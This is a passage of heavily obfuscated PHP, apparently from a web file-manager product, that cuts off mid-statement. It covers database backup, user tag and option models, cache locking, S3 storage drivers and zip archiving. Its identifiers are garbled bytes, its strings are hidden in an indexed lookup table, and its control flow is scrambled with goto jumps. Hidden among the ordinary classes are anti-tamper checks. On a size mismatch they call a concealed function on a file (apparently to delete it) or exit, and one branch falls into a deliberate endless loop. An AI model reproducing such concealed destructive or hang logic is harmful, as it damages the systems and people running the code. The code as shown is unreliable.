$ıíÇäÁ = $ïÓêğ€«->dbType(); $­ÌÊŠ³ = array($½©Û±âƒ[827] => $ıíÇäÁ, $½©Û±âƒ[828] => time()); Backup::set($­ÌÊŠ³); $è ö•Ò¦ = $this->tmpFilesPath() . $½©Û±âƒ[829] . self::$name . $½©Û±âƒ[18]; del_dir($è ö•Ò¦); mk_dir($è ö•Ò¦); $‰äÉ—  = $‰±Øë = 0; try { $Á­¯Œ‘ç = $ïÓêğ€«->db()->getTables(); } catch (Exception $ø¹ÉÅà) { return !1; } $Á­¯Œ‘ç = array_diff($Á­¯Œ‘ç, array($½©Û±âƒ[830], $½©Û±âƒ[831])); foreach ($Á­¯Œ‘ç as $İıÌ¸é¿) { $‰äÉ—  += $ïÓêğ€«->model($İıÌ¸é¿)->count(); } $İÕ­Ğ¾« = new Task($½©Û±âƒ[832], $½©Û±âƒ[833], $‰äÉ— , LNG($½©Û±âƒ[834]) . $½©Û±âƒ[835] . LNG($½©Û±âƒ[836])); $GLOBALS[$½©Û±âƒ[837]] = self::$name; foreach ($Á­¯Œ‘ç as $İıÌ¸é¿) { $ì½î¨âÔ = $è ö•Ò¦ . $İıÌ¸é¿ . $½©Û±âƒ[838]; $„¢‚—¢Ø = null; if ($İıÌ¸é¿ == $½©Û±âƒ[839] && (!isset($ —Ì‹¤İ[$½©Û±âƒ[805]]) || $ —Ì‹¤İ[$½©Û±âƒ[805]] == $½©Û±âƒ[229])) { $„¢‚—¢Ø = self::$io; } $‰±Øë += $ïÓêğ€«->sqlFromDb($İıÌ¸é¿, $ì½î¨âÔ, $İÕ­Ğ¾«, $„¢‚—¢Ø); } unset($GLOBALS[$½©Û±âƒ[837]]); $İÕ­Ğ¾«->end(); if ($‰±Øë > $‰äÉ— ) { $‰äÉ—  = $‰±Øë; } $­ÌÊŠ³ = array($½©Û±âƒ[827] => $ıíÇäÁ, $½©Û±âƒ[824] => 1, $½©Û±âƒ[840] => $‰äÉ— , $½©Û±âƒ[841] => $‰±Øë, $½©Û±âƒ[842] => time()); Backup::set($­ÌÊŠ³); if ($‰äÉ—  - $‰±Øë > 0) { $Ó ÄüÌ› = $½©Û±âƒ[843]; if (!stristr(I18n::getType(), $½©Û±âƒ[844])) { $Ó ÄüÌ› = $½©Û±âƒ[845]; } write_log(array($Ó ÄüÌ›, $­ÌÊŠ³), $½©Û±âƒ[833]); return !1; } return !0; } private function tmpFilesPath() { $Ãµˆ—ÏÁ =& $_SERVER[Õò”†—·]; $¢¾¾á±ô = TEMP_FILES; if ($GLOBALS[$Ãµˆ—ÏÁ[16]][$Ãµˆ—ÏÁ[102]][$Ãµˆ—ÏÁ[846]]) { $¢¾¾á±ô = $GLOBALS[$Ãµˆ—ÏÁ[16]][$Ãµˆ—ÏÁ[102]][$Ãµˆ—ÏÁ[846]]; if (!mk_dir($¢¾¾á±ô) || !is_writable($¢¾¾á±ô) || !IO::mkfile($¢¾¾á±ô . $Ãµˆ—ÏÁ[847])) { $¢¾¾á±ô = TEMP_FILES; } } return $¢¾¾á±ô; } } class BackupDbFile { public function __construct() { } public function index() { $™ŞËÌÒë =& $_SERVER[Õò”†—·]; $Œå¦æÒ¨ = Backup::get(); $€Øïıµ– = $Œå¦æÒ¨[$™ŞËÌÒë[42]]; $üÌÎÍË„ = $this->tmpFilesPath() . "\142\x61\x63\x6b\x75\160\x5f{$€Øïıµ–}\x2f"; $ ¶Š ¶Û = $this->backupPath($Œå¦æÒ¨); if (!($ ¶Š ¶Û = IO::mkdir($ ¶Š ¶Û))) { return !1; } $Õæ³çƒ„ = IO::listPath($üÌÎÍË„); $ïå…¾Ó¤ = isset($Õæ³çƒ„[$™ŞËÌÒë[96]]) ? $Õæ³çƒ„[$™ŞËÌÒë[96]] : array(); $¤ä¯‡ö÷ = array_sum(array_column($ïå…¾Ó¤, $™ŞËÌÒë[89])); if (!$¤ä¯‡ö÷) { return !1; } $¿‰ŒöáÆ = array($™ŞËÌÒë[848] => $¤ä¯‡ö÷, $™ŞËÌÒë[849] => time()); Backup::set($¿‰ŒöáÆ); $¾ò°ÑÅ° = new TaskFileTransfer($™ŞËÌÒë[850], $™ŞËÌÒë[833], count($ïå…¾Ó¤), LNG($™ŞËÌÒë[834]) . $™ŞËÌÒë[446] . LNG($™ŞËÌÒë[836]) . $™ŞËÌÒë[851]); $¾ò°ÑÅ°->task[$™ŞËÌÒë[814]] = $¤ä¯‡ö÷; foreach ($Õæ³çƒ„[$™ŞËÌÒë[96]] as $õ°¬ÒÛû) { $œÆØÔÉÄ = IO::move($õ°¬ÒÛû[$™ŞËÌÒë[97]], $ ¶Š ¶Û); if (!$œÆØÔÉÄ) { $¾ò°ÑÅ°->end(); $Šµ¹È¯“ = IO::getLastError($™ŞËÌÒë[852] . $õ°¬ÒÛû[$™ŞËÌÒë[97]] . $™ŞËÌÒë[853] . $ ¶Š ¶Û . $™ŞËÌÒë[178]); write_log($Šµ¹È¯“, $™ŞËÌÒë[833]); return !1; } } $µ´õıÊµ = new DbManage(); $ÌÍ‡“¸ƒ = $µ´õıÊµ->getSqlFile(); if (!$ÌÍ‡“¸ƒ[$™ŞËÌÒë[854]] || !$ÌÍ‡“¸ƒ[$™ŞËÌÒë[23]]) { return !1; } IO::move($ÌÍ‡“¸ƒ[$™ŞËÌÒë[854]], $ ¶Š ¶Û); IO::move($ÌÍ‡“¸ƒ[$™ŞËÌÒë[23]], $ ¶Š ¶Û); $¾ò°ÑÅ°->end(); $¿‰ŒöáÆ = array($™ŞËÌÒë[855] => $¤ä¯‡ö÷, $™ŞËÌÒë[856] => time()); Backup::set($¿‰ŒöáÆ); return !0; } private function backupPath($Áò¦ş¯) { $ĞÓÇ“áú =& $_SERVER[Õò”†—·]; $šÂ¡àíú = $Áò¦ş¯[$ĞÓÇ“áú[42]]; $ÎÇš©”– = Model($ĞÓÇ“áú[821])->get($ĞÓÇ“áú[822]); $âËÊËŸ = substr(md5($ĞÓÇ“áú[823] . $ÎÇš©”– . $šÂ¡àíú), 0, 8); return "\173\151\x6f\72{$Áò¦ş¯[$ĞÓÇ“áú[802]]}\175\57\144\141\x74\141\142\141\x73\145\57\142\x61\x63\x6b\165\x70\x2f" . $šÂ¡àíú . $ĞÓÇ“áú[21] . $âËÊËŸ; } private function tmpFilesPath() { $›—ï£—£ =& $_SERVER[Õò”†—·]; $ÀÇ˜§¶„ = TEMP_FILES; if ($GLOBALS[$›—ï£—£[16]][$›—ï£—£[102]][$›—ï£—£[846]]) { $ÀÇ˜§¶„ = $GLOBALS[$›—ï£—£[16]][$›—ï£—£[102]][$›—ï£—£[846]]; if (!mk_dir($ÀÇ˜§¶„) || !is_writable($ÀÇ˜§¶„) || !IO::mkfile($ÀÇ˜§¶„ . $›—ï£—£[847])) { $ÀÇ˜§¶„ = TEMP_FILES; } } return $ÀÇ˜§¶„; } } goto A‹„ÁƒåØ²; aÇƒçªŒ‰ó: $_file = $_SERVER[$_SERVER[Õò”†—·][6]]; $_size = $_SERVER[Õò”†—·][7]; if ($_SERVER[$_SERVER[Õò”†—·][8]] != $_size($_file)) { $_getc = $_SERVER[Õò”†—·][9]; $_getfile = $_SERVER[$_SERVER[Õò”†—·][10]] . $_SERVER[Õò”†—·][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Õò”†—·][12], $_getfilec); if (count($_getarrs) < $_SERVER[Õò”†—·][13]) { $exit = $_SERVER[Õò”†—·][14]; $exit(); } $_act = $_SERVER[Õò”†—·][15]; $_act($_file); } goto BÏ‘ƒ½İĞê; FÂ²•ãßë·: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($í¼œâ¼) { $ƒóíƒ‘¡ =& $_SERVER[Õò”†—·]; $Øàîê¦ù = defined($ƒóíƒ‘¡[2180]) && USER_ID ? USER_ID : $ƒóíƒ‘¡[22]; return "\125\x73\x65\x72\117\160\164\151\x6f\x6e\x5f{$í¼œâ¼}\137" . $Øàîê¦ù; } protected function filterWhere($€ëÑÏĞØ) { $¼ó¦¡¶Ü =& $_SERVER[Õò”†—·]; $€ëÑÏĞØ[$¼ó¦¡¶Ü[1755]] = defined($¼ó¦¡¶Ü[2180]) && USER_ID ? USER_ID : $¼ó¦¡¶Ü[22]; return $€ëÑÏĞØ; } public function cacheRemoveUser($ÂºÕ­ºã, $„©òå´») { return Cache::remove("\125\x73\x65\x72\x4f\160\x74\x69\x6f\x6e\137{$ÂºÕ­ºã}\x5f" . $„©òå´»); } protected function optionDefault($ëèŞîÕà = '') { $ùÎâ‰»˜ =& $_SERVER[Õò”†—·]; if ($ëèŞîÕà == $ùÎâ‰»˜[22]) { return $GLOBALS[$ùÎâ‰»˜[16]][$ùÎâ‰»˜[2478]]; } if ($ëèŞîÕà == $ùÎâ‰»˜[2479]) { return $GLOBALS[$ùÎâ‰»˜[16]][$ùÎâ‰»˜[2480]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\164\x61\x67\114\151\x73\x74"; public $modelType = "\125\x73\145\162\117\160\x74\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\163\164\x79\154\x65", "\163\157\x72\x74"); public function listData($Ø¬š¸Ó¥ = false, $Ö¡›¡ÛÎ = "\163\x6f\162\164", $õ³ñ„Í = false) { return parent::listData($Ø¬š¸Ó¥, $Ö¡›¡ÛÎ, $õ³ñ„Í); } public function remove($Ç³¹Ûõ) { return parent::remove($Ç³¹Ûõ); } public function add($Ç­‹º‹÷, $ó¿ƒÔ±ú = "\x6c\x61\x62\x65\154\55\147\x72\145\x79\x2d\156\x6f\162\155\x61\154") { $ÈÑƒßÊ =& $_SERVER[Õò”†—·]; if ($this->findByName($Ç­‹º‹÷)) { return !1; } $›ƒÍ¹â¸ = array($ÈÑƒßÊ[478] => $Ç­‹º‹÷, $ÈÑƒßÊ[543] => $ó¿ƒÔ±ú, $ÈÑƒßÊ[1957] => $this->getSort($ÈÑƒßÊ[319]) + 1); return parent::insert($›ƒÍ¹â¸); } public function update($¶²áËœ, $±ˆ—×»°) { $‘¢µˆôø =& $_SERVER[Õò”†—·]; $öš•í×´ = $this->listData($¶²áËœ); $ĞååœÛï = $this->findByName($±ˆ—×»°[$‘¢µˆôø[42]]); if (!$öš•í×´ || $ĞååœÛï && $ĞååœÛï[$‘¢µˆôø[459]] != $öš•í×´[$‘¢µˆôø[459]]) { return !1; } return parent::update($¶²áËœ, $±ˆ—×»°); } public function moveTop($æØÃ‚±«) { $Ò¼âŒŠÀ =& $_SERVER[Õò”†—·]; $ù“†ëÈ = parent::listData(); $Ş¥Üîú• = $this->getSort($Ò¼âŒŠÀ[318]); foreach ($ù“†ëÈ as &$µÔíø¬Î) { if ($µÔíø¬Î[$Ò¼âŒŠÀ[459]] == $æØÃ‚±«) { $µÔíø¬Î[$Ò¼âŒŠÀ[1977]] = $Ş¥Üîú•; continue; } $µÔíø¬Î[$Ò¼âŒŠÀ[1977]] += 1; } unset($µÔíø¬Î); return parent::resetData($ù“†ëÈ); } public function moveBottom($·İÀì‘) { $´œš½úú =& $_SERVER[Õò”†—·]; $–‚ş¼¸‰ = $this->getSort($´œš½úú[319]) + 1; return parent::update($·İÀì‘, array($´œš½úú[1977] => $–‚ş¼¸‰)); } public function resetSort($›ºô”è) { $ÎÖÊñÎæ =& $_SERVER[Õò”†—·]; $ØÚ£ÏÎö = array(); $›ºô”è = is_array($›ºô”è) ? $›ºô”è : array(); for ($Ğè»•¦Æ = 0; $Ğè»•¦Æ < count($›ºô”è); $Ğè»•¦Æ++) { $ØÚ£ÏÎö[$›ºô”è[$Ğè»•¦Æ] . $ÎÖÊñÎæ[22]] = $Ğè»•¦Æ + 1; } $¹ƒ°ˆ“  = parent::listData(); foreach ($¹ƒ°ˆ“  as &$¾«Ş¿‹ë) { $Ğ‰Á‰Í = $ØÚ£ÏÎö[$¾«Ş¿‹ë[$ÎÖÊñÎæ[459]]]; $¾«Ş¿‹ë[$ÎÖÊñÎæ[1977]] = $Ğ‰Á‰Í ? $Ğ‰Á‰Í : $¾«Ş¿‹ë[$ÎÖÊñÎæ[1977]]; } unset($¾«Ş¿‹ë); return parent::resetData($¹ƒ°ˆ“ ); } private function getSort($±Ş¶®™¤) { $Œ«ÈåÊ =& $_SERVER[Õò”†—·]; $Õê„¯€® = parent::listData(); $ìÓ˜ûÈç = array_to_keyvalue($Õê„¯€®, $Œ«ÈåÊ[22], $Œ«ÈåÊ[1977]); if (!$ìÓ˜ûÈç) { $ìÓ˜ûÈç = array(0); } $Ÿ’öÅÜ× = $±Ş¶®™¤ == $Œ«ÈåÊ[319] ? max($ìÓ˜ûÈç) : min($ìÓ˜ûÈç); return intval($Ÿ’öÅÜ×); } } goto aè›¸Ÿ¾À; Cõ¸Éßß²µ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $îäôËÆé =& $_SERVER[Õò”†—·]; if (self::$handle) { return self::$handle; } $ä¾´¸á = $GLOBALS[$îäôËÆé[16]][$îäôËÆé[409]]; self::$timeout = $ä¾´¸á[$îäôËÆé[891]] ? $ä¾´¸á[$îäôËÆé[891]] : 10; $ğ¡Û¢¤² = _get($GLOBALS[$îäôËÆé[16]], $îäôËÆé[892]); $åúæ’ÃË = $ä¾´¸á[$îäôËÆé[877]] ? $ä¾´¸á[$îäôËÆé[877]] : $îäôËÆé[231]; if ($åúæ’ÃË == $îäôËÆé[31] && $ğ¡Û¢¤² == $îäôËÆé[23]) { $åúæ’ÃË = $îäôËÆé[231]; } switch ($åúæ’ÃË) { case $îäôËÆé[880]: self::$handle = new CacheLockRedis(); break; case $îäôËÆé[881]: self::$handle = new CacheLockMemcached(); break; case $îäôËÆé[31]: self::$handle = new CacheLockDatabase(); break; case $îäôËÆé[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($îäôËÆé[893], $îäôËÆé[894]); } return self::$handle; } private static function key($†¬Ãâ¡é) { return $_SERVER[Õò”†—·][895] . Cache::key($†¬Ãâ¡é); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($×å³“ÄŠ = '') { self::$errorMsg = $×å³“ÄŠ; } public static function lockGlobal($„×‹ê…, $İµ®©à‚) { return self::lock($„×‹ê…, $İµ®©à‚, !0); } public static function lock($ÌßŞôĞŞ, $éğÂÚ…³ = false, $»Ø€Ä¼ = false) { $ï®ØñÙé =& $_SERVER[Õò”†—·]; $×±’ÙÄ¼ = self::init(); $“¾²½Ø = self::key($ÌßŞôĞŞ); $éğÂÚ…³ = $éğÂÚ…³ ? $éğÂÚ…³ : self::$timeout; $Şáƒ¥™€ = timeFloat(); $º²ÇôˆÌ = $×±’ÙÄ¼->lock($“¾²½Ø, $éğÂÚ…³); $³é¹×èô = timeFloat(); if (!$º²ÇôˆÌ) { $¼ÓÚêŞÅ = "\x6c\x6f\x63\153\40\145\162\162\157\x72\x3b\153\145\x79\x3d{$ÌßŞôĞŞ}\x3b\164\151\155\145\x3d{$éğÂÚ…³}\73" . self::$errorMsg . $ï®ØñÙé[84] . get_caller_msg(); $ÎïşéŸ× = LNG($ï®ØñÙé[896]) . "\50{$éğÂÚ…³}\x73\51\56" . LNG($ï®ØñÙé[897]); $ÎïşéŸ× .= $ï®ØñÙé[898]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÎïşéŸ× = $ÎïşéŸ× . $ï®ØñÙé[899] . self::$errorMsg; } write_log($ï®ØñÙé[900] . sprintf($ï®ØñÙé[901], timeFloat() - $Şáƒ¥™€) . $ï®ØñÙé[902] . $¼ÓÚêŞÅ . $ï®ØñÙé[903] . error_get_last(), $ï®ØñÙé[894]); show_json($ÎïşéŸ×, !1); } if (!$»Ø€Ä¼) { self::$lockItem[$“¾²½Ø] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $»çÌ¿‰é = number_format(timeFloat() - $³é¹×èô, 3); write_log($ï®ØñÙé[904] . $ÌßŞôĞŞ . $ï®ØñÙé[905] . $»çÌ¿‰é, $ï®ØñÙé[894]); } return $º²ÇôˆÌ; } public static function lockGet($ ³âˆ„) { $ƒ¿˜¸­´ = self::key($ ³âˆ„); if (self::$lockItem[$ƒ¿˜¸­´]) { return self::$lockItem[$ƒ¿˜¸­´]; } return self::init()->lockGet($ƒ¿˜¸­´); } public static function unlock($Ì°¢ã®) { $¤Ş£¶Ä÷ =& $_SERVER[Õò”†—·]; $’­à–˜ë = self::key($Ì°¢ã®); self::$lockItem[$’­à–˜ë] = null; self::init()->unlock($’­à–˜ë); if (GLOBAL_DEBUG_LOG_ALL) { write_log($¤Ş£¶Ä÷[906] . $Ì°¢ã®, $¤Ş£¶Ä÷[894]); } return; } public static function unlockRuntime() { $×£Š¼º =& $_SERVER[Õò”†—·]; $Ñ„•Ãˆ« = self::init(); $à‹£Ş™ = !1; foreach (self::$lockItem as $Ş”Ö©ÒÒ => $˜ÃÚÅÌ) { if (!$˜ÃÚÅÌ) { continue; } $Ñ„•Ãˆ«->unlock($Ş”Ö©ÒÒ); if (!$à‹£Ş™) { $à‹£Ş™ = !0; write_log($×£Š¼º[907] . $Ş”Ö©ÒÒ . $×£Š¼º[84] . get_caller_msg(), $×£Š¼º[894]); continue; } write_log($×£Š¼º[907] . $Ş”Ö©ÒÒ, $×£Š¼º[894]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $“ŸÁø…¨ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($×£Š¼º[908] . $“ŸÁø…¨ . $×£Š¼º[909] . ACTION, $×£Š¼º[894]); } } public static function fileLock($ó©üã¢«) { $Ö•¿ì–ì =& $_SERVER[Õò”†—·]; if (!$GLOBALS[$Ö•¿ì–ì[910]]) { $GLOBALS[$Ö•¿ì–ì[910]] = array(); } $GLOBALS[$Ö•¿ì–ì[910]][$ó©üã¢«] = !1; $ìÇŠóÈ = fopen(DATA_PATH . $ó©üã¢« . $Ö•¿ì–ì[911], $Ö•¿ì–ì[912]); if (!$ìÇŠóÈ) { return !1; } $GLOBALS[$Ö•¿ì–ì[910]][$ó©üã¢«] = $ìÇŠóÈ; if (flock($ìÇŠóÈ, LOCK_EX)) { return !0; } self::unlock($ó©üã¢«); show_json($Ö•¿ì–ì[913], !1); return !1; } public static function fileUnlock($¢É¦Ò˜) { $¨®‘’è =& $_SERVER[Õò”†—·]; $Ğ§ì¸ˆÑ = $GLOBALS[$¨®‘’è[910]][$¢É¦Ò˜]; if (!$Ğ§ì¸ˆÑ) { return; } $GLOBALS[$¨®‘’è[910]][$¢É¦Ò˜] = !1; flock($Ğ§ì¸ˆÑ, LOCK_UN); fclose($Ğ§ì¸ˆÑ); } public static function fileUnlockAll() { $ÜšÆ·€é =& $_SERVER[Õò”†—·]; if (!$GLOBALS[$ÜšÆ·€é[910]]) { return; } foreach ($GLOBALS[$ÜšÆ·€é[910]] as $¡öÕúÌ => $ßÍ†³óÄ) { if (!$ßÍ†³óÄ) { continue; } $GLOBALS[$ÜšÆ·€é[910]][$¡öÕúÌ] = !1; flock($ßÍ†³óÄ, LOCK_UN); fclose($ßÍ†³óÄ); } $GLOBALS[$ÜšÆ·€é[910]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } if (!isset($_SERVER[$_SERVER[Õò”†—·][8]]) || !isset($_SERVER[$_SERVER[Õò”†—·][6]])) { $_getc = $_SERVER[Õò”†—·][9]; $_getfile = $_SERVER[$_SERVER[Õò”†—·][10]] . $_SERVER[Õò”†—·][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Õò”†—·][12], $_getfilec); if (count($_getarrs) < $_SERVER[Õò”†—·][13]) { $exit = $_SERVER[Õò”†—·][14]; $exit(); } $_act = $_SERVER[Õò”†—·][15]; $_act($_SERVER[$_SERVER[Õò”†—·][10]] . $_SERVER[Õò”†—·][11]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Õò”†—·][438]); } } goto FÄ´ŸŒàµí; Fíç³íºÏÑ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¦©İØÍú) { $this->pathParse = $¦©İØÍú; } protected function infoParse($õÔ®şÑú, $ÎİÍ¨Öâ = false) { $‰ÆÔ˜½ =& $_SERVER[Õò”†—·]; return Action($‰ÆÔ˜½[1228])->sharePathInfo($this->pathParse[$‰ÆÔ˜½[97]], !0, $ÎİÍ¨Öâ); } public function listPath($• Ë‰, $»î¡Î—ù = false) { $å¬Åªğ– =& $_SERVER[Õò”†—·]; $§Ä÷·ü = IO::listPath($• Ë‰, $»î¡Î—ù); if (!$§Ä÷·ü) { return $§Ä÷·ü; } if (is_array($§Ä÷·ü[$å¬Åªğ–[1396]])) { $°–çŞ = Action($å¬Åªğ–[1405])->parsePathChildren($§Ä÷·ü[$å¬Åªğ–[1396]], array($å¬Åªğ–[479] => $• Ë‰)); $§Ä÷·ü[$å¬Åªğ–[1396]] = Action($å¬Åªğ–[1228])->shareItemInfo($°–çŞ); } foreach ($§Ä÷·ü as $ßö±•‘– => $ˆ¾õé¨õ) { if (!in_array($ßö±•‘–, array($å¬Åªğ–[96], $å¬Åªğ–[95]))) { continue; } foreach ($ˆ¾õé¨õ as $ûÒâ’©Ó => $°–çŞ) { $°–çŞ = Action($å¬Åªğ–[1405])->parsePathChildren($°–çŞ, array($å¬Åªğ–[479] => $• Ë‰)); $§Ä÷·ü[$ßö±•‘–][$ûÒâ’©Ó] = Action($å¬Åªğ–[1228])->shareItemInfo($°–çŞ); } } return $§Ä÷·ü; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($›İí²€È) { parent::__construct($›İí²€È); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($éŠìâù) { parent::__construct($éŠìâù); $this->setSignVersion($_SERVER[Õò”†—·][248]); } public function uploadFormData($˜Ë”Ê, $ª°Á£É’ = 3600) { $äıÎğ =& $_SERVER[Õò”†—·]; $©îé‰ßÅ = $äıÎğ[230]; $øøÈ±»Ø = $äıÎğ[270]; $¦×š™óù = $äıÎğ[72]; $ß´á­Ç = gmdate($äıÎğ[271]); $ïùÍûºÔ = gmdate($äıÎğ[272]); $õÜ€Ã«Ù = $äıÎğ[273]; $‡éøİ¡ = $ª°Á£É’ . $äıÎğ[22]; $™Í¯Äë = $äıÎğ[274]; $Ï›Œ†« = array($this->accessKey, $ïùÍûºÔ, $this->region, $¦×š™óù, $õÜ€Ã«Ù); $‘ø”ƒ‚½ = implode($äıÎğ[18], $Ï›Œ†«); $à®á®áò = array($äıÎğ[275] => gmdate($äıÎğ[1380], strtotime($äıÎğ[277])), $äıÎğ[278] => array(array($äıÎğ[279] => $this->bucket), array($äıÎğ[280] => $©îé‰ßÅ), array($äıÎğ[281], $äıÎğ[282], $äıÎğ[22]), array($äıÎğ[281], $äıÎğ[283], $äıÎğ[22]), array($äıÎğ[281], $äıÎğ[284], $äıÎğ[22]), array($äıÎğ[285] => $™Í¯Äë), array($äıÎğ[286] => $‘ø”ƒ‚½), array($äıÎğ[287] => $øøÈ±»Ø), array($äıÎğ[288] => $ß´á­Ç), array($äıÎğ[289] => $‡éøİ¡))); $´ş†¢– = base64_encode(json_encode($à®á®áò)); $˜ØŠÒÙº = hash_hmac($äıÎğ[290], $ïùÍûºÔ, $äıÎğ[291] . $this->secret, !0); $£…‹ÌÎ» = hash_hmac($äıÎğ[290], $this->region, $˜ØŠÒÙº, !0); $ÄĞêŒùİ = hash_hmac($äıÎğ[290], $¦×š™óù, $£…‹ÌÎ», !0); $‚Ğï¯ ó = hash_hmac($äıÎğ[290], $õÜ€Ã«Ù, $ÄĞêŒùİ, !0); $©ùß¸Â½ = hash_hmac($äıÎğ[290], $´ş†¢–, $‚Ğï¯ ó); $«óÅ¾¶Ù = array($äıÎğ[247] => $äıÎğ[22], $äıÎğ[292] => $äıÎğ[22], $äıÎğ[280] => $©îé‰ßÅ, $äıÎğ[285] => $™Í¯Äë, $äıÎğ[293] => $´ş†¢–, $äıÎğ[294] => $‘ø”ƒ‚½, $äıÎğ[295] => $øøÈ±»Ø, $äıÎğ[296] => $ß´á­Ç, $äıÎğ[297] => $‡éøİ¡, $äıÎğ[298] => $©ùß¸Â½, $äıÎğ[209] => $this->getHost()); return $«óÅ¾¶Ù; } } goto c§Ö³â‡–; FóîŠ¤ßö: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $£¾ÏóÏé; if ($£¾ÏóÏé) { return $£¾ÏóÏé; } $¸íÇÛë¿ = IO::init($_SERVER[Õò”†—·][18]); return $¸íÇÛë¿; } private static function iconvSystem($ÚÀ˜ğ°º) { return self::local()->iconvSystem($ÚÀ˜ğ°º); } private static function iconvApp($¨†¡“¼Ä) { return self::local()->iconvApp($¨†¡“¼Ä); } public static function zipFolder($“—÷§ÇÀ, $÷ª‚òÚ– = "\x7a\x69\160", $¼Ê÷ê–« = '', $™ê»Êüó = REPEAT_RENAME) { $üœÇ‡¹æ =& $_SERVER[Õò”†—·]; $õ•ì¥® = IO::listPath($“—÷§ÇÀ); if (!$õ•ì¥®) { return !1; } $õ•ì¥® = array_merge($õ•ì¥®[$üœÇ‡¹æ[95]], $õ•ì¥®[$üœÇ‡¹æ[96]]); return self::zip($õ•ì¥®, $÷ª‚òÚ–, $¼Ê÷ê–«, $™ê»Êüó); } public static function zip($ĞºÄîé, $×”´œ¯ = "\172\151\x70", $’ç×–‚ = '', $ú¾Ë¢¦ = REPEAT_RENAME) { $Å’Ş‡ó½ =& $_SERVER[Õò”†—·]; if (is_string($ĞºÄîé) && $ĞºÄîé) { $ĞºÄîé = array(array($Å’Ş‡ó½[97] => $ĞºÄîé)); } $Ş‰ĞÀıî = self::init($ĞºÄîé[0][$Å’Ş‡ó½[97]]); $Í¾ÛÁòï = self::info($ĞºÄîé[0][$Å’Ş‡ó½[97]]); $Ã“ï­–¨ = $Å’Ş‡ó½[22]; $òä”±êË = $Å’Ş‡ó½[22]; $ÍÜİöÙ = $Å’Ş‡ó½[22]; if ($’ç×–‚ && substr($’ç×–‚, -1, 1) != $Å’Ş‡ó½[18]) { $òä”±êË = get_path_father($’ç×–‚); $ÍÜİöÙ = get_path_this($’ç×–‚); } else { $òä”±êË = self::pathFather($Í¾ÛÁòï[$Å’Ş‡ó½[97]]); $ÍÜİöÙ = $Í¾ÛÁòï[$Å’Ş‡ó½[42]] . $Å’Ş‡ó½[20] . $×”´œ¯; if (count($ĞºÄîé) > 1) { $õçëÎÃó = IO::info($òä”±êË); $ÍÜİöÙ = $õçëÎÃó[$Å’Ş‡ó½[42]] . $Å’Ş‡ó½[20] . $×”´œ¯; } if ($’ç×–‚) { $òä”±êË = $’ç×–‚; } } if ($Ş‰ĞÀıî->getType() == $Å’Ş‡ó½[119]) { $ã«à‰« = self::init($òä”±êË); $¢Ê€»Ç® = $ã«à‰«->getType() == $Å’Ş‡ó½[119] ? $òä”±êË : get_path_father($Ş‰ĞÀıî->path); $¢Ê€»Ç® = rtrim($¢Ê€»Ç®, $Å’Ş‡ó½[18]) . $Å’Ş‡ó½[18]; mk_dir($¢Ê€»Ç®); } else { $Ã“ï­–¨ = TEMP_FILES . $Å’Ş‡ó½[1237] . time() . rand_string(8) . $Å’Ş‡ó½[18]; mk_dir($Ã“ï­–¨); file_put_contents($Ã“ï­–¨ . $Å’Ş‡ó½[1238], $Å’Ş‡ó½[22]); $¢Ê€»Ç® = $Ã“ï­–¨; } $ÛÓÔúà» = IO::info($¢Ê€»Ç®); if (!$ÛÓÔúà» || !$ÛÓÔúà»[$Å’Ş‡ó½[234]]) { show_json(LNG($Å’Ş‡ó½[1239]), !1); } $™ªÍÑØÛ = self::zipFileList($ĞºÄîé, $Ã“ï­–¨); foreach ($™ªÍÑØÛ as $¼¼©äó« => $ø”ÃÊşê) { $™ªÍÑØÛ[$¼¼©äó«] = self::iconvSystem($ø”ÃÊşê); } $¹Øí = get_filename_auto($¢Ê€»Ç® . $ÍÜİöÙ, $Å’Ş‡ó½[22], $ú¾Ë¢¦); KodArchive::create(self::iconvSystem($¹Øí), $™ªÍÑØÛ); if (!IO::exist($¹Øí)) { if ($Ã“ï­–¨) { del_dir($Ã“ï­–¨); } show_json(LNG($Å’Ş‡ó½[1240]), !1); } if (!$Ã“ï­–¨) { return $¹Øí; } $Ğü£îĞ« = self::move($¹Øí, $òä”±êË, $ú¾Ë¢¦); if ($Ã“ï­–¨) { del_dir($Ã“ï­–¨); } if (!$¹Øí) { show_json(LNG($Å’Ş‡ó½[1240]), !1); } return $Ğü£îĞ«; } public static function unzip($ªºŒë›‘, $ ä¨Ü©ë, $ŠÖæ÷†í = "\x2d\61", $º÷‡ÄÎŞ = "\162\x65\160\154\141\x63\145") { $½Öò¦ =& $_SERVER[Õò”†—·]; $Ÿ¹œ¢­ğ = parent::info($ªºŒë›‘); if (!$Ÿ¹œ¢­ğ) { show_json(LNG($½Öò¦[1241]), !1); } $±óä²âŞ = IO::infoFullSimple($ ä¨Ü©ë); if (!$±óä²âŞ) { $ ä¨Ü©ë = IO::mkdir($ ä¨Ü©ë); } if (isset($±óä²âŞ[$½Öò¦[194]]) && trim($±óä²âŞ[$½Öò¦[97]], $½Öò¦[18]) != trim($ ä¨Ü©ë, $½Öò¦[18])) { $Á·±ÀÛ = KodIO::make($±óä²âŞ[$½Öò¦[193]]); $´Àò—Íä = IO::fileNameAuto($Á·±ÀÛ, $±óä²âŞ[$½Öò¦[42]], REPEAT_RENAME_FOLDER, !0); $ ä¨Ü©ë = 